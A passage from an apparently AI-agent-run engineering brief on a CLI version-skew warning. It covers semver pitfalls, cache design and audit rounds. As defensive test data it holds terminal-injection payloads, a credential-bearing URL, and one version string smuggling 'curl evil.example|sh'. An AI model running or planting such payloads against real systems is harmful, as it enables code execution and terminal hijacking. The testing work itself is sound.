here hits it."* Issue #144 is the first instance to hit it, and it did: the lead's own
§4 inherited the error from this sentence.

**The repo already held the correction and only CLAUDE.md was left behind.** Both landed
2026-07-28: `api/cmd/server/main.go:57-63` (commit `b81d1ede`, titled *"fix the
bare-version line"*) and `specs/ai.md` §450. `main.go` names CLAUDE.md's sentence, states
the counter-example six lines away, and stops short of concluding the sentence is wrong.
**Neither file needs changing — both are already right.**

### Scope, exactly two edits — do NOT widen

**(1) `CLAUDE.md:166`** — replace ONLY the headline, the support sentence, and the
measured block. **Keep everything from *"The trap that makes this survive review"* onward
verbatim** — the `v0.11.7.1` invalid-sorts-below tooth, the `+g<sha>` build-metadata
tooth, and the `forgejo.go` precedent were all re-derived clean and are correct.

Replacement (fact-checker's wording, lead-verified; adapt only if you find an error):

> **COMPARING VERSIONS? `golang.org/x/mod/semver` NEEDS A LEADING `v`, AND THIS PROJECT
> SHIPS BOTH SHAPES — the naive compare fails SILENTLY and fails OPEN.** Not PRD-specific;
> any future version comparison here hits it. **The server side is BARE and the CLI side
> carries the `v`, deliberately on both counts:** `api/Dockerfile:41` stamps
> `-X main.version=${UZI_VERSION#v}` and `deploy/chart/Chart.yaml:10-11` carries
> `version`/`appVersion` without the `v` (Model B: served value == image tag == chart
> appVersion), while `Formula/uzi-cli.rb:48` stamps `-X main.version=v#{version}` and
> `scripts/brew-local-test.sh:73` **gates the release on that `v` being present**.
> `api/cmd/server/main.go:51-63` states the split at the source: do not "fix" one side to
> match the other. Git tags are `v`-prefixed too; the controller binary is stamped with no
> version at all.

Then a dated correction note carrying: the universal was FALSE and nine days old when
written; the two SHAs above; that it was migrated from PRD #113 where it was true at that
scope; that the support sentence named 2 of 17 sites while the headline quantified over
all; the live measurement (`uzi version` → `v0.14.0` vs `/api/version` → `0.14.0`, same
host, same release, one minute apart); and that `main.go` + `specs/ai.md` §450 already had
it right on 2026-07-28.

Then replace the measured block with the three rows that matter, **the mixed pair being
the dangerous one**:

```
Compare("0.11.0",  "0.11.7")  =  0   IsValid false/false   <- both bare: two releases read EQUAL
Compare("v0.11.8", "0.14.0")  = +1   IsValid true/false    <- THE LIVE CLI->SERVER PAIR: reads "AHEAD"
Compare("v0.11.8", "v0.14.0") = -1   IsValid true/true     <- what a fixture "naturally" writes
```

plus the inertness result: **0 of 25 rows over a grid of every shipped shape would warn,
including `v0.1.0` against `99.0.0`.** Not "wrong on some pairs" — inert across the whole
input space. Normalise BOTH sides and `IsValid`-guard BOTH.

**(2) `CLAUDE.md:500`** — cites `.gitignore:44` **twice**; line 44 is `__pycache__/` and
the live line is **52** (`.claude/agent-team-tasks/`). Lead verified both. Same staleness
class as (1), in the same file.

### Do NOT change

`specs/ai.md` §450 and `api/cmd/server/main.go` — already correct. `agent/package.json`'s
`"0.1.0-m4"` (inert, flagged only as a note). `controller/Dockerfile`'s missing stamp
(not a defect; nothing compares it).

---

## 11. AMENDMENT 6 — architect revision 2. ADDITIVE. Nothing in flight is invalidated.

The architect self-corrected twice against the auditor's measurements and found one thing
neither the auditor nor the lead had. **This is a design change under §9's freeze rule, so
it is stated as one** — but it is purely additive: the exemption list gains entries and
the test spec gains a row. Nothing already built needs undoing.

### 6a — 🔴 A THIRD EXEMPT COMMAND, AND THE RULE THAT FINDS IT

Amendment 4 bound `logout` + `auth token` from the auditor's report. **`uzi auth status`
has exactly the same property and nobody had named it.** Lead verified at
`auth.go:63-85`: `resolveSettings` + print, **no client**.

**Replace the enumerated list with the RULE** — a list stated as "the two the auditor
found" misses the third by construction:

> **Exempt every command that makes no network call of its own.**

**🔴 AND THE OBVIOUS INSTRUMENT FOR THAT RULE IS WRONG. Measured by the lead:**

```
git grep -F 'env.client('     -- api/cmd/uzi   ->  34 sites
git grep -F 'env.NewClient('  -- api/cmd/uzi   ->   2 sites, one of them login.go:53
```

**`uzi login` builds its client directly** (`login.go:53` `c := env.NewClient(s)`), so a
grep for `env.client(` alone reports login as local-only and **would exempt it for the
wrong reason while looking correct**. The architect flagged this; the lead re-derived the
second grep. `login` is NOT exempt.

**And a file-level grep is insufficient in the other direction too:** `auth.go` appears in
the `env.client(` list, yet `auth status` and `auth token` — both in that file — make no
call. **Resolve the rule per-RunE, not per-file.** Two greps, then read each command body.

### 6b — THE VALIDITY GUARD STOPS H1 AND DOES NOT STOP H2

The architect ran the auditor's four attack strings through
`semver.IsValid(normSemver(v))`: **all four are rejected — and the tempting inference from
that is still wrong.** SemVer build metadata is `[0-9A-Za-z-]` with **no length limit**, so
`0.14.0+` followed by 1 MiB of `A` is **valid semver** and reaches the message.

So: the validity guard stops the four control/bidi payloads on the *warning* path, does
**not** stop the size payload, and does so **only because rule 2 happens to precede the
interpolation** — a statement-ordering property a refactor loses silently.
**`cellText` stays unconditional on both sinks.** The pre-existing `serverRows` sink has
**no validity guard at all**, so all four land there; nothing in §7 H1 softens.

**🔴 TEST CONSEQUENCE — do not get this backwards.** With `cellText` removed:
- at the **warning** path, **only the 1 MiB row should redden**;
- at the **`serverRows`** path, **all four should redden**.

If all four redden at the warning path, the guard order is not what the design specifies.

### 6c — `cli_version` in the cache is FORENSICS ONLY, never keyed on

This resolves a latent conflict rather than adding scope. §7's ungraded note proposed
including the CLI's own version and invalidating when it changes. **That is the right fix
for a VERDICT cache and is redundant under §9's OBSERVATION cache** — recomputing against
`version` each run already self-heals on upgrade, instantly and with no TTL wait.

Mirror `skillState` (`skill.go:74-79`) verbatim, which decided this exact question with its
reason in its own comment: *"Staleness keys on the hash …, NOT on cli_version … cli_version
is retained for human forensics."*

### 6d — TTL 1h stands, and H5's grade does NOT move

The architect rebuilt the argument with two bounds. **H5's wording invites over-reading:
the EXISTENCE of the TTL is the mitigation, its VALUE is not.** For a 50-agent fleet:
no TTL ≈ 90,000 req/h; 1 min ≈ 3,000; **1 h ≈ 50**; 24 h ≈ 2. The three-orders-of-magnitude
drop is entirely between *no TTL* and *any TTL*; 1h→24h buys 24× against an already
negligible baseline and costs a 24× longer silence window.

**A SHORTER negative TTL is rejected.** A failed probe costs the full 2s where a success
costs ~50ms, so shortening it maximises the cost of exactly the case it governs. **One TTL
value, both outcomes.**

### 6e — N7 is belt-and-braces, and know which

`e2e/run-e2e.sh:1665-1667` builds with **no `-ldflags`**, so the harness binary is `dev`
and short-circuits before probing. **Add the env var anyway** — that reason evaporates the
day someone stamps the e2e build.

### Already decided; the architect asked again because it had not seen Amendment 4

- **One line.** The preview's two-line form was a mockup wrap, not a spec.
- **`UZI_VERSION_CHECK=0` goes in BOTH `SKILL.md` and `docs/cli.md`.** The architect notes
  H1 cuts both ways here — `SKILL.md:43` telling agents to read stderr is what makes that
  channel worth protecting *and* worth explaining. Document it, framed as actionable.

---

## 12. AMENDMENT 7 — lead rulings on the coder's two questions. Implementation is at `ea71a367`.

### Ruling 1 — ACCEPTED. `144-design.md` §6's table is wrong in column `A`, rows 6 and 10.

The coder **re-derived all three broken reference implementations against
`x/mod@v0.38.0` rather than inheriting the table**, which is the behaviour this brief has
been asking for since Amendment 1. Its finding: `A` (*normalised + guarded, direction
dropped to `!= 0`*) is **silent** on row 6 (`dev`/`0.14.0`) and row 10
(`v0.11.7.1`/`0.14.0`) because the `IsValid` guards it carries reject both operands.
The design marks those rows `kills: G, A`; measured, they kill **G only**.

The coder also checked the alternative reading (`A` = G-plus-direction, no guards) and it
contradicts rows 7, 8 and 11 — so it is not what was meant.

**No binding moves and the vacuity floor holds:** each broken reference is still killed by
at least one row (N by 1/2/5/12/13, G by 6/10, A by 9). **`144-design.md` §6's `kills`
column for rows 6 and 10 should read `G`.** This is a docs fix on the design document, not
a design change. The shipped test table carries the measured flags, which is correct.

### Ruling 2 — HASH STANDS. §7 H4(b) governs; §9's phrasing was a summary, not a reversal.

The coder identified a genuine conflict I left unruled and resolved it the right way.

- **§7 H4(b)** (auditor): *"key on a hash of the URL, or the context name. Never the raw
  string"* — backed by **executed evidence**: `credentialSafeBase` does not strip userinfo,
  `--url 'http://alice:hunter2@…'` is served, and this cache is the **first** write path
  that would persist a `--url` base at all, into a **0644** file.
- **§9 point 2** (architect short form): *"keyed on a map of normalised base URL."*

§9 is later and §9 overrides where it touches the same thing — but the architect's design
**never engages with H4(b)**, and §9's only explicit conflict ruling is the
`logout`/`auth token` one. Silence is not reversal, especially against measured security
evidence. **The SHA-256 of the normalised URL satisfies both readings** and passes every
§7.2 row (URL A ≠ URL B; `https://x/` == `https://x`), pinned by
`TestVersionCacheDoesNotPersistTheURL` against the userinfo payload.

Accepted cost: the cache file is not human-readable. It is a cache, not configuration.

### Noted from the coder's report, not requiring a ruling

- **The discriminating sanitizer input is not the obvious one, and it was found by RUNNING
  the attacks.** Most payloads make the version string invalid semver, so `SkewWarning`
  goes silent and the payload never reaches stderr — meaning **a test built from
  `ESC[2J`/bidi passes against a completely unsanitized warning path.** What gets through
  is a payload whose *trimmed* form is valid semver: `normSemver` calls `TrimSpace`, and
  `\r`/`\n`/`\t` are `unicode.IsSpace`, so they are stripped for the **comparison** and
  survive into the **print**. **`0.14.0\r` is the live injection.** This is Amendment 6's
  §6b arriving one level deeper, and it is a stronger statement of it.
- The trailing-`\n` row needed a second assertion (stderr is exactly one line) to
  discriminate at all — `assertNoControlChars` skips `\n` as the line separator, so
  without it that row was **a pin, not evidence**.
- `_, _ = fmt.Fprint*` edits in `root.go`/`version.go` are pre-existing errcheck findings
  that `whole-files: true` made blocking once the branch touched those files. Expected
  ratchet adoption cost, not scope creep.
- First `task gate:api` run died on `Error: parallel golangci-lint is running` — a
  host-global lock held by a sibling worktree, not a failure. Re-ran green.

---

## 13. AMENDMENT 8 — §11 6b's TEST CONSEQUENCE IS REFUTED. Implementation at `f2f778d6`.

Refuted by the coder, re-derived independently by the lead against `x/mod@v0.38.0`.
**The binding is unaffected and strengthened; only the INSTRUMENT was wrong.**

### What 6b said, and why it is wrong

> *"With `cellText` removed — at the warning path, **only the 1 MiB row should redden**.
> If all four redden at the warning path, the guard order is not what the design
> specifies."*

**All five redden at the warning path. The guard order IS what the design specifies.**
The missing mechanism is `normSemver`'s `strings.TrimSpace`.

Measured, lead's run, on the literal payloads:

```
input                        IsValid   reaches the message?
erase display                false     no
line overwrite               false     no
osc8                         false     no
bidi                         false     no
1 MiB plain                  false     no
1 MiB BUILD METADATA         true      YES
trailing CR   "0.14.0\r"     true      YES
leading  CR   "\r0.14.0"     true      YES
trailing LF   "0.14.0\n"     true      YES
trailing TAB  "0.14.0\t"     true      YES
```

`\r`, `\n` and `\t` are `unicode.IsSpace`, so `TrimSpace` strips them **for the validity
check and the comparison** while `SkewWarning` interpolates the **verbatim** original.
**There is a whole second class the guard cannot see — larger than the size class, and it
contains the sharpest payload in the audit**: `0.14.0\r` erases uzi's own prefix mid-line.

**CORRECTED INSTRUMENT SIGNATURE**, replacing 6b's: with `cellText` removed, at the
**warning** path the four whitespace-edge rows **and** the build-metadata row redden
(5); at **`serverRows`**, all four auditor payloads redden. Coder's re-run: **10 of 10**.

**Anyone using 6b's stated signature as an instrument would read a correct implementation
as broken.** That is why this is recorded rather than quietly dropped — 6b was written
into the brief by the lead, and both the auditor and the tester were dispatched to test it.

### The sub-finding, where the LEAD was wrong and the coder was right

The 1 MiB build-metadata row produces **SILENCE**, not a truncated warning. `compactText`
(`run.go:1006-1014`) cuts at 200 and **appends `"…"`**; `…` is not in SemVer's
build-metadata charset `[0-9A-Za-z-]`, so the truncated string is invalid and the verdict
is silent. Safer than a truncated warning, but a **different assertion**: that row pins
`wantWarning: false` plus a byte count, and the mutation control turns it into a
one-megabyte line on stderr.

**The lead's first re-derivation contradicted the coder here and was wrong** — it modelled
the cap as a plain `s[:200]` slice with no ellipsis, which stays valid semver and would
print. Reading `compactText` settled it in one command. Recorded because the coder's own
first draft asserted *"warning printed AND bounded"* and went **red against correct
code** — the same wrong model, reached independently by two agents.

### Also landed in `f2f778d6`

- **6a** — `auth status` exempt. The set is **exhaustive, not enumerated**: counting
  `RunE:` against client constructions per file, every file matches except `auth.go`
  (3 RunE / 1 client), `login.go` (2/1), `skill.go` (4/0) — which accounts for every
  local-only command in the tree. **No fourth surprise.** `auth.go`'s single `env.client(`
  is at `:150` inside `newWhoamiCmd`, which is exactly §11 6a's "insufficient in the other
  direction" case. The switch matches the two `auth` leaves **by parent**, so a future
  network-bound `uzi auth <verb>` is not swept in and `uzi token list` / `uzi skill status`
  keep their status despite sharing leaf names.
- **6c** — `cli_version` recorded, never read back; freshness keys on `checked_at` alone.
  It had to become a **parameter** because `uzicli` has no access to the ldflags stamp —
  same reason `NewSkillInstaller` takes it.
- **6e** — the coder corrected a comment **its own first commit introduced**, which had
  claimed the skew hook would fire under the e2e harness. It would not: no `-ldflags`, so
  the binary is `dev` and short-circuits.

### Two process notes from the coder, both shapes this repo documents

- A greedy regex mangled `versioncheck_test.go` mid-edit; caught by the compiler, restored
  from HEAD, redone with anchored literal replacements.
- **Its first mutation run printed no test output at all** — `grep -c` returned 0, exited
  1, and short-circuited the `&&` chain before `go test` ran. *"Empty output read as a
  clean run for about ten seconds."* A control that produces no output is not a control.

---

## 14. AMENDMENT 9 — audit round. NO BLOCKING FINDINGS at `f2f778d6`.

Every round-1 finding (H1-H5) closed, each **verified by execution rather than by reading**,
in pristine `git archive` extracts. Harness: CLI built with
`-ldflags "-X main.version=v0.11.8"` — an unstamped build short-circuits and never probes —
driven at a hostile `/api/version`, every run carrying a `curl` positive control.

### The sharpest single piece of evidence on this branch

**The cache file on disk contains `"version":"0.14.0\r"` — the raw control character,
unsanitized.** That is the *positive proof* H4(c) is satisfied: a write-time stripper would
have removed it there and did not. Then, with the hostile server **shut down** (`pgrep`
control confirming it), the cache-read path prints 213 bytes, valid UTF-8, no control
bytes. **Raw `\r` on disk, clean bytes on the terminal, on a run that touched no network.**

Same measurement answers the `RecordServerVersion` 256-rune question: it is a storage bound
and is **not** being leaned on as a sanitizer — if it were, the `\r` could not be in the file.

Other closures worth recording: H1 — nine payloads at both sinks, **not one control byte or
bidi codepoint** at either, on any payload. H2 — the 1 MiB string yields **255 bytes** of
stdout, longest line 219 (round 1: 1048628 / 1048596). H4(b) — `grep -c hunter2` and
`grep -c 127.0.0.1` on the cache both **0**, before and after 6c added `cli_version`.

### 🔴 THE MOVING TREE CORRUPTED A RESULT, AND IT WAS NEARLY REPORTED

The auditor built a binary from the **shared worktree** after `git status` showed clean but
after the coder had begun editing. It measured `uzi auth status` → **0 probes** and was
about to record "correctly exempt". **It is not exempt at `ea71a367`** — it had unknowingly
built the coder's uncommitted fix. Static reading said *not exempt*, the binary said
*exempt*, and **only that contradiction exposed it**.

This is the lead's scheduling failure from §13's preamble arriving at a second agent.
Relayed to reviewer and tester as a claim to check. **Process fix the auditor asks for, and
it is right: give validators a frozen SHA that is not also the coder's live worktree.**

### Amendment 6b falsified a second time, independently — and the two counts DIFFER LEGITIMATELY

| SHA | mutation | rows reddening at the warning path |
|---|---|---|
| `ea71a367` | auditor's Mutation A | **4** (trailing CR, leading CR, trailing newline, trailing tab) |
| `f2f778d6` | coder's re-run | **5** (the four above + `unbounded_build_metadata`) |

**Both are correct for the SHA each was measured at** — `f2f778d6` adds that row to the
table. §13 recorded 5 citing the coder; this is not a discrepancy to reconcile and the two
numbers are kept side by side deliberately. At `serverRows` the auditor measured **5**, not
the 4 the prediction stated, so **6b undercounted at both sinks.**

### Two new findings, both real at `ea71a367`, both ALREADY FIXED at `f2f778d6`

- **MEDIUM — `uzi auth status` probed AND warned at `ea71a367`.** Measured matrix:
  `auth status probes=1 warned=1` against `auth token 0/0`, `logout 0/0`, `whoami 1/1`,
  `token list 1/1` (correct). `ea71a367` implemented the **enumerated list**, not the rule —
  precisely the trap §11 6a documented. **Plus a prose falsification in the same commit**:
  the doc comment read *"`logout` and `auth token` are **the two** commands that make NO
  network call today."* False; `auth status` is a third.
- **LOW — the length bound was unpinned at the warning sink at `ea71a367`.** Narrowest
  possible mutation (leave the control-stripper, change only `compactText`'s `max`) reddened
  only tests on *other* sinks. The risk was concrete, not theoretical: `SkewWarning`'s own
  doc invites the refactor (*"Sanitizing here as well would be free defence-in-depth"*), and
  anyone acting on it with a control-only stripper would have put 1 MiB on stderr with
  nothing failing.

**The auditor found both only because the tip moved.** Its own words: *"had I stopped at my
assigned scope I would have reported two open findings that were already closed."*

### Ungraded — two are actionable and route to the coder

1. **`version.go`'s comment overstates its own mechanism.** It says the `--json` path is safe
   because *"the structural encoder escapes what matters there"*. Measured: `encoding/json`
   escapes C0 and U+2028/29 but **not U+202E and not DEL**. **The decision is fine; narrow
   the sentence, not the behaviour.**
2. **`compactText` slices at 200 BYTES (`len(s)`), not runes, and can cut mid-rune.** Output
   stays valid UTF-8 only because `cellText`'s outer `strings.Map` re-encodes the orphan as
   U+FFFD — probed with 199 ASCII + `€€€€`: 257 bytes, valid UTF-8. **The safety is emergent
   from the ORDERING and nothing pins it.** A refactor swapping that order, or using
   `compactText` alone, emits invalid UTF-8 from attacker-chosen input.
3. Informational: the 1 MiB payload goes silent because `cellText` appends U+2026, illegal in
   build metadata. Fail-closed and correct, but anyone later making the truncation
   semver-safe silently inverts that test row's expectation.
4. Informational: the cache is 0644 holding a SHA-256 and a timestamp — strictly less than
   `config.toml` already exposes.

### Scan slot + gates

Slot is `none (gap, noted 2026-07-21)`; marker present, not re-raised. Tools of the
auditor's own choosing, labelled as such. **`govulncheck` exit 3 → 0 verified independently**
in a pristine extract — and the zero is discriminating rather than vacuous: it still reports
*1 vulnerability in a required module the code does not call*, which a silently no-op'd
scanner could not produce. `gitleaks` over the code commit: clean.

**The auditor deliberately did NOT run `task gate:api`**, correctly: the shared worktree held
another writer's staged changes for most of the audit, and `golangci-lint` takes a
host-global lock that would have risked killing the tester's run. It ran the package tests in
pristine extracts instead (`EXIT=0` at both `ea71a367` and `d96b6fe8`).

**One incidental result worth keeping:** its first extract was `api/`-only, and
`TestInstructionEvidenceIsWellFormed` **failed closed** — *"cannot read e2e/run-e2e.sh …
an unverifiable check must fail rather than pass quietly"* — catching the harness error. That
test is behaving exactly as designed, and it is a live instance of the
fixtures-across-the-module-boundary shape `CLAUDE.md` documents.

---

## 15. AMENDMENT 10 — review round. ONE NEW DEFECT TO FIX (N-1). Everything else closed.

Reviewer verified B1/B2/B3 closed **by execution against a request-logging stub**, not by
reading, each with a positive discriminator:

- **B1** — unstamped binary: `rc=4`, **0 requests, 0 files written**. `IsStampedVersion`
  short-circuits above the probe, and the disposition is inverted from `checkForgejoVersion`
  exactly as B1 demanded.
- **B2** — against a listener that accepts and never replies: `run1 32.10s, run2 30.04s,
  run3 30.03s`. **run1 − run2 = 2.06s ≈ `serverProbeTimeout`** — the probe happens once and
  the failure is cached. The entry is `{"version":"","checked_at":…}`.
- **B3** — two stubs, one `$HOME`, alternating: correct version per server, cache holds
  **2** entries, and the trailing-slash spelling collapses onto the same entry rather than
  making a third.

Also executed: `--quiet` and `UZI_VERSION_CHECK=0` each produce **0 requests**, so they
suppress the *work*, not merely the print; a warm cache gives 0 requests and still warns;
`uzi version` stdout line 1 is still `v0.11.8` (the `brew-local-test.sh` gate).

### 🔴 N-1 — A TRANSIENT PROBE FAILURE POISONS A GOOD CACHE ENTRY AND SILENCES EVERY COMMAND FOR THE FULL TTL

**Live at the tip. This is a real defect in the shipped design and it is the one thing this
round changes.** Reviewer's execution, one `$HOME`, one URL:

```
1. server UP,      token list    -> 1 warning     cached: '0.14.0'
2. server DOWN,    uzi version   -> 0 warnings    cached: ''       <- good value overwritten
3. server BACK UP, token list    -> 0 warnings                     <- silent, server is healthy
```

Lead re-derived the mechanism from the source. `CachedServerVersion` returns
`(e.Version, true)` for an empty entry — **empty and fresh are indistinguishable to the
caller** — so every later command takes the `fresh` branch, never re-probes, and
`warnVersionSkew(env, "")` prints nothing, for up to an hour after recovery.

**`uzi version` is the amplifier, and it is a SECOND write site.** `versioncheck.go:174`
writes the cache **unconditionally, regardless of freshness**, unlike the hook at `:148`
which is guarded by `if !fresh`. So the command a user runs precisely when they suspect
something is wrong is the one most likely to poison the cache, on the most likely occasion —
the server having a bad moment.

**This is not a deviation from the spec; the hole is IN the spec.** §9.2 says "stores the
last **attempt**" and the implementation does exactly that. §11 6d's rejection of a shorter
negative TTL is correct on latency grounds and is what makes the window a full hour.

**FIX, contained, preserving both properties:** on a **failed** probe, do not overwrite an
existing entry that is non-empty — record the failure without clearing the last known
version, at **both** write sites (`:148` and `:174`). No re-probe storm, no lost reading.

**And take N-3 in the same change, because it closes the same failure from the other side:**
`uzi version` probes live every invocation (measured `2.10s / 2.05s / 2.05s` against a
hanging listener) and is now **the only command that writes the cache and never reads it** —
so the "check my setup" command is the slowest one against a sick server. **A cache read as
a fallback when the live probe fails fixes N-1 and N-3 at once.**

### N-2 — MY ERROR: `144-design.md` was UNTRACKED, and Amendment 7 ruled a correction against it

`git ls-files --error-unmatch` confirms: *"did not match any file(s) known to git"*, and
`git status -uall` cannot show it because the directory is `.gitignore:52`. The brief's own
DURABILITY CAVEAT documents the force-add pattern; **I applied it to the brief and not to the
design.** §12 Ruling 1 issues a correction *to that file* — a ruling recorded against an
artifact that dies with the worktree. Force-added in this commit.

### N-4 — the attacker-controlled bound on stderr is 157 chars, and it lives in ANOTHER FILE

Third independent derivation of this mechanism. What the reviewer's run adds is **where the
boundary is**:

```
metadata len 150 -> version len 157  ->  warning PRINTED, stderr 262 bytes
metadata len 400 -> version len 407  ->  SILENT
1 MiB                                ->  SILENT
```

So **157 characters of attacker-controlled text do reach stderr** on a line prefixed `uzi:`
— stripped of controls and Cf by `cellText`, so not an injection, but it is attacker text.
Above 200, `compactText` appends `…` (outside SemVer's build-metadata charset), the string
becomes invalid, and the warning vanishes. **That silence is a property of a cosmetic
constant in `run.go` that nobody editing `versioncheck.go` would think to check.** One
sentence at `warnVersionSkew` naming the coupling.

### Two mutations the coder did NOT report, both caught by the suite

- `if !semver.IsValid(cli) || !semver.IsValid(srv)` → `if false` reddens **exactly** `dev_cli`
  (row 6) and `four-part_cli` (row 10) — precisely the rows flagged `killsUnguarded`. **B1's
  guard is genuinely gated.**
- Dropping `cellText` from `warnVersionSkew` reddens only the four
  `TestSkewWarningSanitizesTheServerString` rows while `TestVersionCommandSanitizesServerBuildInfo`
  stays green. **The two sinks are independently gated.**

The reviewer also **re-derived the fixture's ground truth independently** — 13 rows computed
against `x/mod@v0.38.0` without touching the shipped code. All 13 `want` values correct; kill
sets `naive=[1 2 5 12 13]`, `unguarded=[6 10]`, `direction=[9]`, matching the table exactly.
And the exit-code differential's second row is **not decoration**: `success path exit=0` vs
`not found path exit=4`.

**`IsStampedVersion`'s export is WARRANTED, measured**: without it every `go build ./cmd/uzi`
binary would resolve settings, probe (2s worst case) and write a cache file on every command
— the modal configuration for anyone working in this repo. The only export-free alternative
is a **fourth** copy of `normSemver`.

### Deletion lens, and gate slots at the live tip (isolated copy)

```
deadcode -test ./...   rc=0   0 findings   (gating form, empty baseline)
deadcode       ./...   rc=0  43 findings   ==  main's 43, no additions
gofmt -l (assignment form)    drifted: []
go vet ./...                  rc=0
go test -race -count=1 -v     RUN=478 PASS=478 FAIL=0 SKIP=0
```

`lint:api` was **deliberately not run** by the reviewer: it is ratcheted against `origin/main`,
which cannot resolve inside a detached archive, and running it live risks the documented
`golangci-lint` host-global lock contention with the tester. **That slot rests on the coder's
report alone and the reviewer says so** rather than implying coverage it does not have.

### Two nits, both pre-existing

- `withVersion` (`version_test.go:16`) mutates the package-level `version` with a `t.Cleanup`
  restore. Correct today (nothing calls `t.Parallel()`); a landmine the moment anyone
  parallelises this package.
- No test for valid JSON with a nil map (`{"servers":null}`); `loadVersionCheckState` handles
  it, but the corrupt-file test covers unparseable only.

### 🔴 DISCLOSURE — the reviewer hit the REAL deployment, and disclosed rather than buried it

Running `uzi version` once without `env -i`, its `ea71a367` build read the real
`~/.config/uzi/config.toml`, sent `GET /api/version` to `https://uzi.example.com`, and
**created `~/.config/uzi/version-check.json` on the developer's host.** Read-only route, no
server-side writes. Lead confirmed the file exists (144 bytes, a SHA-256 key, `0.14.0`, a
timestamp, **no `cli_version` field** — consistent with an `ea71a367` build, i.e. pre-6c) and
that it holds no secret and no URL.

**It is also an unplanned end-to-end validation of the whole feature:** a `v0.11.8`-stamped
binary against the live server printed
`uzi: CLI v0.11.8 is behind server 0.14.0` — issue #144's exact opening scenario, working
against production.

---

## 16. AMENDMENT 11 — reviewer's provenance audit of its own report. B1's EVIDENCE was contaminated; B1 STANDS.

**One measurement in §15 was produced by a binary built from the shared worktree mid-edit:
the B1 row "dev binary makes 0 probes".** Re-derived from pristine `git archive` extracts,
now with a positive control so an all-zero result cannot pass as evidence:

```
ea71a367  dev binary, token list         reqs=0 warn=0 cachefile=no
d96b6fe8  dev binary, token list         reqs=0 warn=0 cachefile=no
d96b6fe8  stamped,    token list         reqs=1 warn=1 cachefile=yes   <- harness is LIVE
```

**The conclusion is unchanged; only its evidence is now sound.**

**🔴 WHY THAT ONE ROW SURVIVED THE FIRST RE-DERIVATION IS THE LESSON.** The reviewer had
already re-run everything else from the contaminated batch. It carried this row forward
*"because 'dev short-circuits' felt independent of the exemption edits."* That is the
generalisable trap: **contamination is a property of the BUILD, not of the topic**, so
reasoning about whether a result *could* have been affected by the specific edits is the
wrong filter — and it is the filter a careful person reaches for, because re-running
everything feels wasteful. The right question is only *which binary produced this number*.

Both the auditor and the reviewer hit this, independently, and **both were caught by the
same shape**: a contradiction between static reading and observed behaviour, not by
suspicion. The auditor's was `auth status` reading not-exempt while its binary behaved
exempt; the reviewer's was a `cli_version` key on disk that the struct it had just read did
not declare.

**Restore verified against the VCS, not a grep count**: `diff -r` of the mutation working
copy against a fresh `ea71a367` extract, **rc=0** — which is `CLAUDE.md`'s own prescription
for exactly this check.

### Exemption set re-verified at `d96b6fe8`, pristine extract, all eight correct

`git diff --stat d96b6fe8 d26d77bb -- api/ e2e/ docs/` is **empty**, confirming the
`CLAUDE.md` commit touched no code, so the earlier `d26d77bb` measurements transfer.

```
auth token 0/0   logout 0/0   skill status 0/0   auth status 0/0   <- exempt
version 1/1 (relocated, warns inline)
token list 1/1   repo list 1/1   whoami 1/1                        <- not exempt
```

### N-1 unchanged and still reproducing at `d96b6fe8`; N-4's boundary confirmed as an independent third derivation

The reviewer states it read §13 before finishing and **did not use 6b as an instrument** —
so its N-4 is a genuinely independent derivation of the `compactText`/`…` mechanism rather
than an echo of the amendment. Three agents, three routes, same mechanism.

---

## 17. AMENDMENT 12 — audit addendum. ONE LOW finding, and a correction to §13's framing.

### 🔴 THE SEPARATOR HALF OF THE TRIM CLASS IS UNPINNED — the whole suite passes with the guard removed

**The compound-predicate shape**, and the best finding of the audit round. The class splits by
*which mechanism handles it*, and the shipped table covers only one side:

- **tab / LF / VT / FF / CR / U+0085** are `unicode.IsControl` → `sanitizeTTY` strips them
  **independently of any trimming**.
- **U+00A0, U+1680, U+2000-200A, U+2028, U+2029, U+202F, U+205F, U+3000** are **Zs/Zl/Zp —
  neither `IsControl` nor `Cf`** — so `sanitizeTTY` does not touch them. They are handled
  **only** by `TrimSpace`.

And `TrimSpace` appears **twice** — `compactText` (`run.go:1007`) and `cellText`'s closing
`return` — each individually sufficient, so **neither is observable**. Removing one: suite
green. Removing **both**:

```
TESTS_EXIT=0          <- THE ENTIRE SUITE STAYS GREEN
ls    -> SURVIVED: U+2028 (LINE SEPARATOR reaches stderr)
ps    -> SURVIVED: U+2029      nbsp -> SURVIVED: U+00A0      ideo -> SURVIVED: U+3000
cr    -> clean        <- sanitizeTTY covers it by a DIFFERENT mechanism
```

**The `cr` row is why the table cannot see this.** Every row in
`TestSkewWarningSanitizesTheServerString` (tab, CR, LF) is *also* covered by `sanitizeTTY`,
so all three stay green with the trimming guard entirely gone. **The rows that would
discriminate are exactly the ones absent.**

**Impact today: none** — the code is correct. The finding is the *unpinnedness*: nothing
would tell you if it stopped being true, and the test's "exactly one line" assertion splits
on `\n`, so a surviving U+2028 would not trip it. **Fix is one row:**
`{"trailing line separator", "0.14.0 ", true}`.

### CORRECTION to §13 — "a second bypass class, LARGER than the size class" overstated the severity

§13 (mine) said the trim class is *"larger than the size class, and it contains the sharpest
payload in the audit."* The auditor enumerated the **whole** class rather than sampling it —
every `unicode.IsSpace` fast-path codepoint plus the full `White_Space` property, 16 members
with per-row `curl` controls — and the refinement matters:

```
bm_ok    "0.14.0+g1a2b3c4"                    warned=True    <- positive control
bm_esc   "0.14.0+<ESC>[2Jowned"               warned=False   <- guard rejects
bm_semi  "0.14.0+; run curl evil.example|sh"  warned=False   <- guard rejects
```

`x/mod/semver` enforces SemVer's `[0-9A-Za-z-]` on build metadata, so the guard-passing set
is exactly **{valid semver decorated with whitespace}**. **Larger in cardinality (16 vs 1),
strictly WEAKER in capacity: it can inject spacing, never a sentence.** `0.14.0\r` was the
sharpest payload precisely because `\r` is the one member with a cursor effect — and it is
stripped. My framing implied a broader capability than exists.

**And the mechanism is better than the test table suggests:** `compactText` opens with
`sanitizeTTY(strings.TrimSpace(s))`, so `cellText` trims **exactly the same class**
`normSemver` trims. The sanitizer and the guard agree **by construction, not by
coincidence** — anything the semver check becomes blind to is, by the same predicate,
already gone from the printed string.

Full enumeration at the tip: all 16 members warn, all 245 bytes, **zero payload characters
in stderr**. The class is fully closed in shipped code.

### The 4-vs-5 count, reconciled by the auditor independently

It re-ran Mutation A at the code tip and got **5**, against its own **4** at `ea71a367` —
because `f2f778d6` added the `unbounded build metadata` row to that table. Matches §14's
record exactly. Each number is right for its own SHA.

### Two instrument failures the auditor caught in its OWN harness, both reported

1. **A uniform result across all 21 cells.** It selected the payload via `UZI_URL=".../?m=$m"`,
   but the client builds `TrimRight(base,"/") + "/api/version"`, so the query landed mid-URL
